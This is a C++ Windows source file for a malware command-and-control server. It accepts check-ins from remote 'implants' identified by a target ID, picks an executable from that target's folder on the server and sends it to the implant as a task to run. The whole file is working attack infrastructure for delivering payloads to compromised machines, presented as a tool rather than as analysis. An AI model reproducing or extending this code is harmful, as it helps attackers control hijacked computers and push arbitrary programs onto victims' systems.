#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <tchar.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include "SmallStuff.h"

#pragma comment(lib, "User32.lib")
#pragma comment (lib, "Ws2_32.lib")

#define HOST_ADDRESS "0.0.0.0"
#define LP_PORT 9999


int __cdecl main(void) 
{
		WSADATA wsaData;
		SOCKET Waiting = INVALID_SOCKET;
		SOCKET Inbound = INVALID_SOCKET;

		sockaddr_in settings;
		settings.sin_family = AF_INET;
		settings.sin_addr.s_addr = inet_addr(HOST_ADDRESS);
		settings.sin_port = htons(LP_PORT);

		int bytesSent = 0;
		int bytesRecv = 0;

		sockaddr_in client_info;
		int size = sizeof(client_info);
		oink oinkPTR;
		task sendTask;

		WIN32_FIND_DATA fndData;
		WIN32_FIND_DATA fndData2;
		HANDLE dirHandle = INVALID_HANDLE_VALUE;
		HANDLE dirHandle2 = INVALID_HANDLE_VALUE;
		HANDLE fileHandle = INVALID_HANDLE_VALUE;
		DWORD dirERROR = 0;
		TCHAR dirName[MAX_PATH];
		TCHAR dirName2[MAX_PATH];
		LARGE_INTEGER filesize;
		char fileBUFF[BUFF_SIZE];
		DWORD bytesRead = 0;
		

	//initialize wsa ================================================================================================//
	if(WSAStartup(MAKEWORD(2,2), &wsaData))
	{
		printf("--WSA Failed to initialize. %ld\n", WSAGetLastError());
		system("pause");
		return 1;
	}

	//create listening socket =======================================================================================//
	Waiting = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(Waiting == INVALID_SOCKET)
	{
		printf("--Failed to create socket. %ld\n", WSAGetLastError());
		WSACleanup();
		system("pause");
		return 1;
	}

	//bind to the socket ============================================================================================//
	if(bind(Waiting, (sockaddr *)&settings, sizeof(settings)) == SOCKET_ERROR)
	{
		printf("--Failed to bind to socket. Error %ld \n", WSAGetLastError());
		closesocket(Waiting);
		WSACleanup();
		system("pause");
		return 1;
	}

	//Listen for connections ========================================================================================//
	if(listen(Waiting, 1) == SOCKET_ERROR)
	{
		printf("--Could not listen on socket. Error %ld \n", WSAGetLastError());
		closesocket(Waiting);
		WSACleanup();
		system("pause");
		return 1;
	}
	
	//accept connections in a loop ==================================================================================//
	do{

		printf("--Waiting for the bacon!\n");

		Inbound = accept(Waiting, (sockaddr*)&client_info, &size);
		if(Inbound == INVALID_SOCKET)
		{
			printf("--Accept failed with error: %ld\n", WSAGetLastError());
			closesocket(Waiting);
			WSACleanup();
			system("pause");
			return 1;
		} 
		else
		{

			//receive the oink ======================================================================================//
			printf("--Client has connected:\n\n\tIP Address :: %s\n\n", inet_ntoa(client_info.sin_addr));

			bytesRecv = recv(Inbound, reinterpret_cast<char*>(&oinkPTR), sizeof(oink), 0);
			if(bytesRecv)
			{
				printf("--Received oink from client:\n\n"
					   "\tTarget ID :: %x\n"
					   "\tOink Code :: %d\n\n",
					    oinkPTR.PIG_ID, oinkPTR.oinkCode);

				//check for exe's to upload =========================================================================//
				ZeroMemory(&dirName, sizeof(dirName));
				_snwprintf_s(dirName, MAX_PATH, L"c:\\server\\%02x", oinkPTR.PIG_ID);
				_snwprintf_s(dirName2, MAX_PATH, L"c:\\server\\%02x\\*.exe", oinkPTR.PIG_ID);
				wprintf(L"Looking in directory %ls\n", dirName);

				dirHandle = FindFirstFile(dirName, &fndData);
				dirHandle2 = FindFirstFile(dirName2, &fndData2);
				if(dirHandle2 == INVALID_HANDLE_VALUE)
				{
					printf("--No tasking in directory...\n");
					//if you dont find any exe's then set task id to TID_NONE
					sendTask.taskID = TID_NONE;
					sendTask.taskSize = NULL;
					printf("--Sending NULL task.\n");
					bytesSent = send(Inbound, reinterpret_cast<char*>(&sendTask), sizeof(sendTask), 0);
					if(bytesSent == 0)
					{
						printf("Send failed with error: %ld\n", WSAGetLastError());
						shutdown(Inbound, SD_BOTH);
					}
					shutdown(Inbound, SD_SEND);
				}
				else //valid directory
				{
					do{ //go through the files until you get to the last one
						if(fndData2.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY)
						{
							continue; //skip any folders in the directory
						}
						else //not a directory
						{
							wprintf(L"Found file %ls in tasking directory.\nFile is %ld bytes in size", fndData2.cFileName, fndData.nFileSizeLow);
						}
					}while(FindNextFile(dirHandle2, &fndData2)); //there are still files in the directory

					wprintf(L"\n\nGoing with file %ls because its the last one.\n", fndData2.cFileName);

					//create the exe task ===========================================================================//
					
					_snwprintf_s(dirName, MAX_PATH, L"%ls\\%ls", dirName, fndData2.cFileName);
					wprintf(L"Preparing to upload %ls to the target.\n", dirName);

					//open handle to the last file ==================================================================//
					fileHandle = CreateFile(dirName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
					if(fileHandle == INVALID_HANDLE_VALUE) 
					{
						printf("Cannot open input file. Error: %x\n", GetLastError());
					}
					else //valid file handle
					{
						//get the file size =========================================================================//
						sendTask.taskID = TID_EXE;
						sendTask.taskSize = GetFileSize(fileHandle, NULL);
						_snwprintf_s(sendTask.taskName, MAX_PATH, L"%ls", fndData2.cFileName);
						if(sendTask.taskSize == INVALID_FILE_SIZE)
						{
							printf("Error getting file size, ERROR %x\n", GetLastError());
						}
						else //got the file size
						{
							//send the task to the implant ==========================================================//
							printf("--Sending exe task instruction to implant.\n");
							bytesSent = send(Inbound, reinterpret_cast<char*>(&sendTask), sizeof(sendTask), 0);
							if(bytesSent == 0)
							{
								printf("Send failed with error: %ld\n", WSAGetLastError());
								shutdown(Inbound, SD_SEND);
							}
							else //sent task successfully
							{
								//get oink ack
								bytesRecv = recv(Inbound, reinterpret_cast<char*>(&oinkPTR), sizeof(oink), 0);
								if(bytesRecv)
								{
									printf("received oink code %d from target id %x\n", oinkPTR.oinkCode, oinkPTR.PIG_ID);
									if(oinkPTR.oinkCode == OC_ACK)
									{
										printf("--Sending file to target...\n");
										do{
											ReadFile(fileHandle, fileBUFF, BUFF_SIZE, &bytesRead, NULL);
											bytesSent = send(Inbound, fileBUFF, bytesRead, 0);
											printf("Read %d bytes from file, Sent %d bytes to the target.\n", bytesRead, bytesSent);
										}while(bytesSent == BUFF_SIZE);
										shutdown(Inbound, SD_SEND);
									}
								}
								else //no oink ack
								{
									printf("Never received oink ack.\n");
									shutdown(Inbound, SD_SEND);
								}

							}

						}

					}

				}

			}
			else //if the recv of the initial oink fails
			{
				shutdown(Inbound, SD_BOTH);
				printf("connection closed\n");
				closesocket(Inbound);
				system("pause");
			}

			printf("DONE!, restarting loop\n\n\n");


		}
		CloseHandle(fileHandle);
		FindClose(dirHandle);
		closesocket(Inbound);


	}while(true);

	closesocket(Waiting);
	WSACleanup();



	system("pause");
    return 0;
}